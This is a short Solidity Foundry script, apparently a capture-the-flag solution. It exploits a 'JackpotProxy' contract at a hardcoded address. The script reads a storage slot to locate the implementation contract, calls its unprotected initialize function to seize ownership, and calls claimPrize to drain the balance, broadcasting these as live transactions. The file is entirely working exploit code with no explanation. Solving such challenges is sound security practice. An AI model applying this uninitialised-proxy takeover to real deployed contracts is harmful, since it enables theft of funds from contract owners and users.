// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Trickster.sol";

contract TricksterTest is Script {
    JackpotProxy public target;
    address instanceAddress = 0x45595abB1382577db3e5837d87952cEb3E689A5F;

    function setUp() public {
        target = JackpotProxy(payable(instanceAddress));
        vm.label(address(target), "Challenge");
    }

    function run() public {
        vm.startBroadcast();

        address jackpotAddress = address(
            uint160(uint256(vm.load(address(target), bytes32(uint256(1)))))
        );

        Jackpot(payable(jackpotAddress)).initialize(msg.sender);
        Jackpot(payable(jackpotAddress)).claimPrize(jackpotAddress.balance / 2);

        require(target.balance() == 0, "Failed");

        vm.stopBroadcast();
    }
}
